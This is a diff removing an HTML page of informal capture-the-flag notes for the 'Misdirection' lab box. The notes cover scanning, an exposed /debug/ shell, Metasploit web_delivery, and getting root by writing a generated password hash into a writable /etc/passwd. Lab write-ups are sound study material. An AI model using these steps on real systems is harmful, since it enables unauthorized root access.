@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>Misdirection</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>Misdirection</h1><br/>ran normal namp scan and found port 80, 8080, 22, and 3306<br />ran dirsearch and nikto<br />dirsearch foung that on 8080 there was a url /debug/ that gave an interactive shell<br />the shell was super f&#39;d ( I could not execute certain commands due to this limitation)<br />went to msf and used exploit/multi/script/web_delivery<br />NEW SHELL (you will get kicked out and have to go in to session 2) as www-data<br /><br />from here sudo -l revealed that I could sudo  /bin/bash as brexit<br />lse.sh revealed that I could write to /etc/passwd!<br />openssl passwd -1 coolhand<br />$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40<br />vi /etc/passwd<br />root:$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40:0:0:root:/root:/bin/bash<br />:wq!<br />su<br />coolhand<br />YEEEEEEEEET!!!!!!!!! rooted!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />??stuck in debug??                        <br />msfconsole<br />use exploit/multi/script/web_delivery    <br />!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!<br />^^^^^^^^^^^^^^^^^^^^<br />give raj his due and a lookup when doing the writeup!!</div></body></html>
